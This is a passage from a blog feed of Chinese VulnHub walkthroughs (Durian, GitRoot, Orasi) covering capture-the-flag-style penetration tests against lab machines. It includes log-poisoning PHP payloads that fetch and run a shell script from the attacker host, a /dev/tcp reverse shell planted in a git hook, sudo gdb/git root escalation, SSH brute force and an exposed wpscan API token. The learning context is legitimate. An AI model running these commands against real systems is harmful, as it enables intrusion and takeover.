id=\"防火墙策略\"><a class=\"markdownIt-Anchor\" href=\"#防火墙策略\">#</a> 防火墙策略</h3>\n<p>试了大半天没有结果，直接重新导入靶机了，这次靶机 ip 发生变化了</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1545.png\" width=\"580\" alt=\"Image\">\n<p>再次用 burp 捕获数据，思考为什么不能反弹</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1546.png\" width=\"550\" alt=\"Image\">\n<p>既然可以执行命令，执行处 id 的结果，说明命令执行没有问题，但是去下载 python 简易 web 上的程序时出错了，很有可能是防火墙的问题，果然一看，防火墙不知道因为什么原因打开了，就一直卡住了</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1547.png\" width=\"420\" alt=\"Image\">\n<p>关闭防火墙，再次测试</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1548.png\" width=\"420\" alt=\"Image\">\n<h3 id=\"curl指定数据包\"><a class=\"markdownIt-Anchor\" href=\"#curl指定数据包\">#</a> curl 指定数据包</h3>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">用curl发送数据包，下载木马</span></span><br><span class=\"line\">curl -i -s -k -X $&#x27;GET&#x27; \\</span><br><span class=\"line\">-H $&#x27;User-Agent: Mozilla/5.0 &lt;?php system($_GET[\\&#x27;y\\&#x27;]);?&gt; (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36&#x27; \\</span><br><span class=\"line\"><span class=\"meta prompt_\">$</span><span class=\"language-bash\"><span class=\"string\">&#x27;http://192.168.0.172/cgi-data/getImage.php?file=/var/log/durian.log/access.log&amp;y=wget+http://192.168.0.168/shell.sh+-O+/var/www/html/blog/shell1.sh&#x27;</span></span></span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-1549.png\" width=\"660\" alt=\"Image\">\n<p>当看到 python 服务器上有了回馈信息后，就说明是正确的</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1550.png\" width=\"480\" alt=\"Image\">\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">执行下载的程序，并且用来接收shell</span></span><br><span class=\"line\">curl -i -s -k -X $&#x27;GET&#x27; \\</span><br><span class=\"line\">-H $&#x27;User-Agent: Mozilla/5.0 &lt;?php system($_GET[\\&#x27;y\\&#x27;]);?&gt; (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36&#x27; \\</span><br><span class=\"line\"><span class=\"meta prompt_\">$</span><span class=\"language-bash\"><span class=\"string\">&#x27;http://192.168.0.172/cgi-data/getImage.php?file=/var/log/durian.log/access.log&amp;y=bash+/var/www/html/blog/shell1.sh&#x27;</span></span></span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-1551.png\" width=\"660\" alt=\"Image\">\n<p>成功拿到网站权限，开始提权</p>\n<h3 id=\"sudogdb提权\"><a class=\"markdownIt-Anchor\" href=\"#sudogdb提权\">#</a> sudo (gdb) 提权</h3>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL3huLS1saW5wZWFzLTR0M2tnbWkzOHEuc2g=\">放一个 linpeas.sh</span>, 查到 gdb 权限设置错误</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1552.png\" width=\"480\" alt=\"Image\">\n<p>参照 gtfobin，直接提权为 root 用户<br>\n <code>gdb -nx -ex 'python import os; os.setuid(0)' -ex '!sh' -ex quit</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1553.png\" width=\"540\" alt=\"Image\">\n<p>-&gt; 成功拿到了 root 权限</p>\n",
            "tags": [
                "VULNHUB 41-50"
            ]
        },
        {
            "id": "http://www.n1h1l157.live/2021/11/01/VULNHUB/148%20GITROOT/",
            "url": "http://www.n1h1l157.live/2021/11/01/VULNHUB/148%20GITROOT/",
            "title": "VULNHUB 48 GITROOT",
            "date_published": "2021-10-31T16:00:00.000Z",
            "content_html": "<p>靶机下载地址: <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvZ2l0cm9vdC0xLDQ4OC8=\">https://www.vulnhub.com/entry/gitroot-1,488/</span><br>\n 教程链接地址 1: <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuaGFja2luZ2FydGljbGVzLmluL2dpdHJvb3QtMS12dWxuaHViLXdhbGt0aHJvdWdoLw==\">https://www.hackingarticles.in/gitroot-1-vulnhub-walkthrough/</span><br>\n 教程链接地址 2: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oMGozbi5tZWRpdW0uY29tL3Z1bG5odWItZ2l0cm9vdC0xLWQxZWE1ZGUzZDEwYQ==\">https://h0j3n.medium.com/vulnhub-gitroot-1-d1ea5de3d10a</span></p>\n<h3 id=\"确认攻击目标\"><a class=\"markdownIt-Anchor\" href=\"#确认攻击目标\">#</a> 确认攻击目标</h3>\n<p>攻击机 KALI： 192.168.0.135 (由于设置成了 DHCP、可能多变)<br>\n 靶机 WARZONE3：桥接于 192.168.0.1 的网卡，ip 未知</p>\n<p>1 ）确定靶机 ip 地址和开放的端口<br>\n由已至内网靶机所在主机 MAC 地址自动扫描靶机 ip<br>\n <code>sudo arp-scan -l | grep 'a0' | awk '&#123;print $1,$2&#125;' | cut -d ' ' -f 1 | uniq</code></p>\n<p>靶机开启之前和开启之后各扫一次，得到靶机 ip 192.168.0.187</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1470.png\" width=\"520\" alt=\"Image\">\n<p>2 ）对靶机开放的端口做更深一步的检索，检索各个服务上的详细信息<br>\n <code>sudo nmap -sVC -T4 -Pn --open -p- 192.168.0.187 --min-rate=5000</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1471.png\" width=\"470\" alt=\"Image\">\n<blockquote>\n<p>检索到的有效服务如下所示：<br>\n22 ssh：可尝试 ssh 爆破与一些对应版本漏洞利用<br>\n 80 http：可对 web 进行渗透测试收集信息<br>\n 11211 memcache：未知端口</p>\n</blockquote>\n<h3 id=\"网站信息收集\"><a class=\"markdownIt-Anchor\" href=\"#网站信息收集\">#</a> 网站信息收集</h3>\n<p>打开 <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMC4xODcv\">http://192.168.0.187/</span> 进行 http 信息收集</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1472.png\" width=\"400\" alt=\"Image\">\n<p>提示我们有一个域名需要检查一下，将这个子域名以及它的上一级域名的 DNS 解析地址进行修改</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1473.png\" width=\"320\" alt=\"Image\">\n<p>再次查看子域名，发现是一个 wordpress 站点</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1474.png\" width=\"520\" alt=\"Image\">\n<p>而域名处还是原来的界面</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1475.png\" width=\"390\" alt=\"Image\">\n<p>对 wordpress 站点进行扫描扫描，获取其存在的用户名<br>\n <code>wpscan -e u --api-token eG5iT4ooiuP7eVJVedsHhlgx8xeZHmAJjBr13asnjEc --url http://wp.gitroot.vuln/</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1476.png\" width=\"660\" alt=\"Image\">\n<p>找到一个用户名 beth</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1477.png\" width=\"410\" alt=\"Image\">\n<p>顺便爆破一下这个用户名的密码，但是没有结果</p>\n<p><code>wpscan --api-token eG5iT4ooiuP7eVJVedsHhlgx8xeZHmAJjBr13asnjEc -U beth -P /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --url http://wp.gitroot.vuln/</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1478.png\" width=\"660\" alt=\"Image\">\n<p>进行目录扫描，看看有没有敏感的站点</p>\n<p><code>gobuster dir -x php,bak,zip,rar,php.bak -w /usr/share/wordlists/dirbuster/directory-list- 2.3-medium.txt -u http://wp.gitroot.vuln/</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1479.png\" width=\"660\" alt=\"Image\">\n<h3 id=\"子域名扫描\"><a class=\"markdownIt-Anchor\" href=\"#子域名扫描\">#</a> 子域名扫描</h3>\n<p>都点开看了一下发现没有什么敏感的文件，既然这个站下有 wp.gitroot.vuln 这个子域名，会不会有其他的子域名，尝试一波扫描子域名</p>\n<p><code>gobuster vhost -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://wp.gitroot.vuln/ -o subdomain.txt</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1480.png\" width=\"660\" alt=\"Image\">\n<p>扫描到了子域名 repo.gitroot.vuln，将其添加到本地 hosts 文件中</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1481.png\" width=\"410\" alt=\"Image\">\n<p>打开 <span class=\"exturl\" data-url=\"aHR0cDovL3JlcG8uZ2l0cm9vdC52dWxuLw==\">http://repo.gitroot.vuln/</span> 进行信息收集</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1482.png\" width=\"520\" alt=\"Image\">\n<p>提示有 set.php 页面和 get.php 页面</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1483.png\" width=\"420\" alt=\"Image\">\n<p>按提示设置个 key 和 value 的值看看</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1484.png\" width=\"420\" alt=\"Image\">\n<p>但是好像没有什么用，get.php 文件显示不出来有价值的信息</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1485.png\" width=\"420\" alt=\"Image\">\n<p>下一步就扫扫目录，看有没有什么新发现</p>\n<p><code>gobuster dir -x php,bak,zip,rar,php.bak -w /usr/share/wordlists/dirbuster/directory-list- 2.3-medium.txt -u http://repo.gitroot.vuln/</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1486.png\" width=\"660\" alt=\"Image\">\n<p>所有的目录都打开看了看，发现没有什么有价值的信息</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1487.png\" width=\"450\" alt=\"Image\">\n<p>换个字典在扫一波，这次用 common.txt 这个字典<br>\n <code>gobuster dir -x php,bak,zip,rar,php.bak -w /usr/share/dirb/wordlists/common.txt -u http://repo.gitroot.vuln/</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1488.png\" width=\"620\" alt=\"Image\">\n<p>多得到了一个文件，为 http://repo.gitroot.vuln/.git/HEAD<br>\n 访问之后显示没有权限去查看，但是确定文件是真实存在的</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1489.png\" width=\"420\" alt=\"Image\">\n<p>并且可以访问得到这个文件</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1490.png\" width=\"460\" alt=\"Image\">\n<h3 id=\"git-dumper使用\"><a class=\"markdownIt-Anchor\" href=\"#git-dumper使用\">#</a> git-dumper 使用</h3>\n<p>对于 /.git/HEAD 文件泄漏，可以使用 git-dumper 工具，在 github 上下载</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1494.png\" width=\"370\" alt=\"Image\">\n<p><code>python3 git_dumper.py http://repo.gitroot.vuln/ ./repo_gitroot</code> <br>\n 用此工具将源码给下载到本地的 repo_gitroot 文件夹中</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1491.png\" width=\"520\" alt=\"Image\">\n<p>看了看这几个文件，有一个文件显示了几个疑似用户名</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1492.png\" width=\"630\" alt=\"Image\">\n<p>有一个文件提示说去看看其他的 git 仓库</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1493.png\" width=\"540\" alt=\"Image\">\n<h3 id=\"git-切换历史仓库\"><a class=\"markdownIt-Anchor\" href=\"#git-切换历史仓库\">#</a> git 切换历史仓库</h3>\n<p>一个一个的 git show，在一个仓库中找到了如下的代码<br>\n <code>git show ce3843e497dd28f992250d36ee1b4e8c9e0f18e9</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1495.png\" width=\"530\" alt=\"Image\">\n<p>或者用 git reset --hard 来切换 git 的仓库信息<br>\n <code>git reset --hard b069fdde4cf12980175c3fbd79316fe42b57e19a</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1496.png\" width=\"530\" alt=\"Image\">\n<p>-&gt; 得到了一组用户和密码 pablo：ihjedpvqfe</p>\n<p>但是这个用户和密码是来不到这台服务器的</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1497.png\" width=\"660\" alt=\"Image\">\n<h3 id=\"hydra-爆破-ssh\"><a class=\"markdownIt-Anchor\" href=\"#hydra-爆破-ssh\">#</a> hydra 爆破 ssh</h3>\n<p>看来只有自己设置用户名字典来爆破了，先尝试自己输入一些在收集信息过程中看到的疑似密码的字典</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1498.png\" width=\"440\" alt=\"Image\">\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">用自定义的密码爆破没有结果，就用rockyou.txt字典来爆破</span></span><br><span class=\"line\">hydra -L user.txt -P passwd.txt ssh://192.168.0.187 -f -t 64 -I -vV</span><br><span class=\"line\">hydra -L user.txt -P rockyou.txt ssh://192.168.0.187 -f -t 64 -I -vV</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-1499.png\" width=\"660\" alt=\"Image\">\n<img data-src=\"/N1h1l157/VULNHUB/image-1500.png\" width=\"660\" alt=\"Image\">\n<p>需要爆破很长时间才能爆破出来，目前还没有找到更快的爆破的方法</p>\n<h3 id=\"sshpass-连接靶机\"><a class=\"markdownIt-Anchor\" href=\"#sshpass-连接靶机\">#</a> sshpass 连接靶机</h3>\n<p>第一次登陆点击确认连接，之后就可以用 sshpass 来登陆<br>\n sshpass -p mastergitar ssh <span class=\"exturl\" data-url=\"bWFpbHRvOnBhYmxvQDE5Mi4xNjguMC4xODc=\">pablo@192.168.0.187</span></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1501.png\" width=\"470\" alt=\"Image\">\n<h3 id=\"服务器信息收集\"><a class=\"markdownIt-Anchor\" href=\"#服务器信息收集\">#</a> 服务器信息收集</h3>\n<p>之前在 git 不同的版本上找过过一个密码，看一看服务器有哪些用户，试试之前哪个密码是不是这几个用户的密码，依次尝试 jen beth root，发现 ihjedpvqfe 不是个密码</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1502.png\" width=\"340\" alt=\"Image\">\n<p>用户文件下提示需要检查一个新的 git 仓库</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1503.png\" width=\"370\" alt=\"Image\">\n<p>既然有新的 git 仓库，肯定有个.git 文件，直接 find 全局搜索</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1504.png\" width=\"560\" alt=\"Image\">\n<p>进到这个文件夹下，依次使用 git show 查看不同的本地仓库的改变</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1505.png\" width=\"480\" alt=\"Image\">\n<p>没有什么新发现，在看看这个文件夹下有没有什么敏感文件</p>\n<p>居然发现了一个非常奇怪的文件，有这么多前缀相同的，肯定有什么问题</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1506.png\" width=\"620\" alt=\"Image\">\n<p>排序查看有什么情况  <code>ls -Alh | sort -k4 | tail -n5</code> <br>\n 看到 dev-43 与众不同，查看其内容之后有一些 git 的提交信息</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1507.png\" width=\"660\" alt=\"Image\">\n<p>查看到第三条日志中是增加了一些信息，用 git show 查看一下增加的信息<br>\n <code>git show 06fbefc1da56b8d552cfa299924097ba1213dd93</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1508.png\" width=\"660\" alt=\"Image\">\n<p>得到了一个密码，用这个密码成功拿到了 beth 用户的权限</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1509.png\" width=\"440\" alt=\"Image\">\n<p>在用户目录下看到了一个提示文件</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1510.png\" width=\"230\" alt=\"Image\">\n<p>只需要将 zip 文件放在～jen/public/repos/ 下，就会将它自动解压到 jen 仓库，看来是 jen 用户的一个定期执行任务的脚本</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1511.png\" width=\"700\" alt=\"Image\">\n<h3 id=\"linux使用7z\"><a class=\"markdownIt-Anchor\" href=\"#linux使用7z\">#</a> linux 使用 7z</h3>\n<p>测试了一下，服务器上没有 unzip 命令，但是有 7z 命令，构造下列 Linux 命令<br>\n cd /tmp;git init;echo -e ‘#!/bin/bash \\nbash -i &gt;&amp; /dev/tcp/192.168.0.168/4444 0&gt;&amp;1’ &gt; /tmp/.git/hooks/post-commit;chmod 777 /tmp/.git/hooks/post-commit;7z a /tmp/shell.zip/tmp/.git;cp /tmp/shell.zip/home/jen/public/repos/</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1512.png\" width=\"660\" alt=\"Image\">\n<p>这个复合的 linux 命令的作用就是将反弹 shell 的脚本打印到一个新的 git 仓库的 hooks/post-commit 中，并且赋予可执行权限，在用 7z 进行压缩为 zip，最后在将其复制到 jen 用户下的 repos 中。</p>\n<p>监听 shell 等待 jen 用户的 shell 反弹出来，接收到之后标准化 tty</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1513.png\" width=\"520\" alt=\"Image\">\n<p>到处看一看文件，都翻阅一下看看有敏感信息没有</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1514.png\" width=\"440\" alt=\"Image\">\n<h3 id=\"viminfo信息泄漏\"><a class=\"markdownIt-Anchor\" href=\"#viminfo信息泄漏\">#</a> .viminfo 信息泄漏</h3>\n<p>发现 viminfo 中有一个 binzpbeocnexoe，可能是个密码</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1515.png\" width=\"460\" alt=\"Image\">\n<p>su root 尝试了一下，是失败的，它不是 root 的密码，继续试一下，发现它就是用户 jen 的密</p>\n<h3 id=\"sudogit提权\"><a class=\"markdownIt-Anchor\" href=\"#sudogit提权\">#</a> sudo (git) 提权</h3>\n<p>这样子就可以用来看 jen 的权限设置，看是否有什么问题，找到了 jen 用户可以直接调用 root 的 git 命令执行</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1516.png\" width=\"660\" alt=\"Image\">\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">在gtfobins上找到了提权方法</span></span><br><span class=\"line\">sudo git help config</span><br><span class=\"line\">!/bin/bash</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-1517.png\" width=\"310\" alt=\"Image\">\n<p>-&gt; 成功拿到了 root 的 shell</p>\n",
            "tags": [
                "VULNHUB 41-50"
            ]
        },
        {
            "id": "http://www.n1h1l157.live/2021/11/01/VULNHUB/143%20ORASI/",
            "url": "http://www.n1h1l157.live/2021/11/01/VULNHUB/143%20ORASI/",
            "title": "VULNHUB 43 ORASI",
            "date_published": "2021-10-31T16:00:00.000Z",
            "content_html": "<p>靶机下载地址: <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvb3Jhc2ktMSw2NjAv\">https://www.vulnhub.com/entry/orasi-1,660/</span><br>\n 教程链接地址: <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vc2FpbmV0L3AvMTYzMTYyNzQuaHRtbA==\">https://www.cnblogs.com/sainet/p/16316274.html</span></p>\n<h3 id=\"确认攻击目标\"><a class=\"markdownIt-Anchor\" href=\"#确认攻击目标\">#</a> 确认攻击目标</h3>\n<p>攻击机 KALI： 192.168.31.135 (由于设置成了 DHCP、可能多变)<br>\n 靶机 ORASI：桥接于 192.168.31.1 的网卡，ip 未知</p>\n<p>1 ）确定靶机 ip 地址和开放的端口<br>\n由已至内网靶机所在主机 MAC 地址自动扫描靶机地址<br>\n <code>sudo arp-scan -l | grep 'a0' | awk '&#123;print $1,$2&#125;' | cut -d ' ' -f 1 | uniq</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1242.png\" width=\"520\" alt=\"Image\">\n<p>2 ）扫到 ip 之后对 ip 进行端口扫描<br>\n <code>sudo arp-scan -l | grep 'a0' | awk '&#123;print $1,$2&#125;' | cut -d ' ' -f 1 | xargs nmap -PA</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1243.png\" width=\"660\" alt=\"Image\">\n<blockquote>\n<p>这样扫看似扫出来了所有的端口，但是端口里的具体信息却没有识别，由于之前很多次都是因为在端口扫描阶段没有继续深入扫描端口信息而无法渗透，比如 git 泄漏、dns 解析域名泄漏、各种服务的版本都含有更多的敏感信息。因此，需要对得到的服务器进一步深入扫描得到端口信息</p>\n</blockquote>\n<p>3 ）端口详细扫描<br>\n <code>sudo nmap -A -p- 192.168.31.17 --min-rate 5000</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1244.png\" width=\"520\" alt=\"Image\">\n<p>-&gt; 靶机 ip：192.168.31.17 靶机开放端口 21,22,80,5000</p>\n<h3 id=\"ida反编译elf\"><a class=\"markdownIt-Anchor\" href=\"#ida反编译elf\">#</a> IDA 反编译 ELF</h3>\n<p>匿名登陆 ftp 服务器寻找敏感信息，得到 pub 文件夹下的 url 文件</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1245.png\" width=\"420\" alt=\"Image\">\n<p>用 file 命令可以判断出 url 是一个 ELF 文件，要反编译 ELF 文件需要借助 IDA, 工具，这里将此文件传输到了一台具有 IDA 工具的电脑上</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1246.png\" width=\"660\" alt=\"Image\">\n<p>反编译之后在 main 方法中看到 /sh4d0w$s</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1247.png\" width=\"660\" alt=\"Image\">\n<h3 id=\"leet加密语言\"><a class=\"markdownIt-Anchor\" href=\"#leet加密语言\">#</a> leet 加密语言</h3>\n<p>打开 <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMTc=\">http://192.168.31.17</span> 进行信息收集</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1248.png\" width=\"280\" alt=\"Image\">\n<p>看到一个奇怪的数字和英文单词 leet，查了一下其具体代表什么含义</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1249.png\" width=\"680\" alt=\"Image\">\n<p>原来是一种黑客的加密语言，可以根据这一点生成一份字典</p>\n<p>利用 crunch 命令生成一份字典  <code>crunch 6 6 1337leet -o wordlist.txt</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1250.png\" width=\"440\" alt=\"Image\">\n<p>由之前反编译产生的一个疑似目录的文件，进行访问</p>\n<p>[<span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMTcvc2g0ZDB3\">http://192.168.31.17/sh4d0w</span><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>s</mi><mo stretchy=\"false\">]</mo><mo stretchy=\"false\">(</mo><mi>h</mi><mi>t</mi><mi>t</mi><mi>p</mi><mo>:</mo><mi mathvariant=\"normal\">/</mi><mi mathvariant=\"normal\">/</mi><mn>192.168.31.17</mn><mi mathvariant=\"normal\">/</mi><mi>s</mi><mi>h</mi><mn>4</mn><mi>d</mi><mn>0</mn><mi>w</mi></mrow><annotation encoding=\"application/x-tex\">s](http://192.168.31.17/sh4d0w</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\">s</span><span class=\"mclose\">]</span><span class=\"mopen\">(</span><span class=\"mord mathnormal\">h</span><span class=\"mord mathnormal\">t</span><span class=\"mord mathnormal\">t</span><span class=\"mord mathnormal\">p</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">:</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord\">/</span><span class=\"mord\">/</span><span class=\"mord\">1</span><span class=\"mord\">9</span><span class=\"mord\">2</span><span class=\"mord\">.</span><span class=\"mord\">1</span><span class=\"mord\">6</span><span class=\"mord\">8</span><span class=\"mord\">.</span><span class=\"mord\">3</span><span class=\"mord\">1</span><span class=\"mord\">.</span><span class=\"mord\">1</span><span class=\"mord\">7</span><span class=\"mord\">/</span><span class=\"mord mathnormal\">s</span><span class=\"mord mathnormal\">h</span><span class=\"mord\">4</span><span class=\"mord mathnormal\">d</span><span class=\"mord\">0</span><span class=\"mord mathnormal\" style=\"margin-right:0.02691em;\">w</span></span></span></span>s)</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1251.png\" width=\"380\" alt=\"Image\">\n<h3 id=\"网站信息收集\"><a class=\"markdownIt-Anchor\" href=\"#网站信息收集\">#</a> 网站信息收集</h3>\n<p>扫描一下此网站是否存在敏感目录  <code>gobuster dir -x php,txt,html,zip,rar,jpg,png -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.31.17/</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1252.png\" width=\"660\" alt=\"Image\">\n<p>打开 <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMTc6NTAwMC8=\">http://192.168.31.17:5000/</span> 进行信息收集</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1253.png\" width=\"430\" alt=\"Image\">\n<p>访问地址 <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMTc6NTAwMC9zaDRkMHckcw==\">http://192.168.31.17:5000/sh4d0w$s</span></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1254.png\" width=\"470\" alt=\"Image\">\n<p>页面有回显表示漏洞就在这个地方，现在我们有一个敏感的 url 地址和一份字典，可以根据此字典爆破此 url 地址的输入</p>\n<h3 id=\"ffuf模糊测试\"><a class=\"markdownIt-Anchor\" href=\"#ffuf模糊测试\">#</a> ffuf 模糊测试</h3>\n<p>使用 ffuf 测试 input 的参数应该是字典中的哪个<br>\n <code>ffuf - u &quot;http://192.168.31.17:5000/sh4d0w\\$s?FUZZ=/etc/passwd&quot; -w wordli.txt -fs 8</code> <br>\n 加载到了一个为 l333tt 的地址，此种情况下页面回显为 200</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1255.png\" width=\"620\" alt=\"Image\">\n<p>访问此网站，发现了回显与输入的内容一致</p>\n<p>[<span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMTc6NTAwMC9zaDRkMHc=\">http://192.168.31.17:5000/sh4d0w</span><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>s</mi><mo stretchy=\"false\">?</mo><mi>l</mi><mn>333</mn><mi>t</mi><mi>t</mi><mo>=</mo><mi>p</mi><mi>w</mi><mi>d</mi><mo stretchy=\"false\">]</mo><mo stretchy=\"false\">(</mo><mi>h</mi><mi>t</mi><mi>t</mi><mi>p</mi><mo>:</mo><mi mathvariant=\"normal\">/</mi><mi mathvariant=\"normal\">/</mi><mn>192.168.31.17</mn><mo>:</mo><mn>5000</mn><mi mathvariant=\"normal\">/</mi><mi>s</mi><mi>h</mi><mn>4</mn><mi>d</mi><mn>0</mn><mi>w</mi></mrow><annotation encoding=\"application/x-tex\">s?l333tt=pwd](http://192.168.31.17:5000/sh4d0w</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">s</span><span class=\"mclose\">?</span><span class=\"mord mathnormal\" style=\"margin-right:0.01968em;\">l</span><span class=\"mord\">3</span><span class=\"mord\">3</span><span class=\"mord\">3</span><span class=\"mord mathnormal\">t</span><span class=\"mord mathnormal\">t</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\">p</span><span class=\"mord mathnormal\" style=\"margin-right:0.02691em;\">w</span><span class=\"mord mathnormal\">d</span><span class=\"mclose\">]</span><span class=\"mopen\">(</span><span class=\"mord mathnormal\">h</span><span class=\"mord mathnormal\">t</span><span class=\"mord mathnormal\">t</span><span class=\"mord mathnormal\">p</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">:</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord\">/</span><span class=\"mord\">/</span><span class=\"mord\">1</span><span class=\"mord\">9</span><span class=\"mord\">2</span><span class=\"mord\">.</span><span 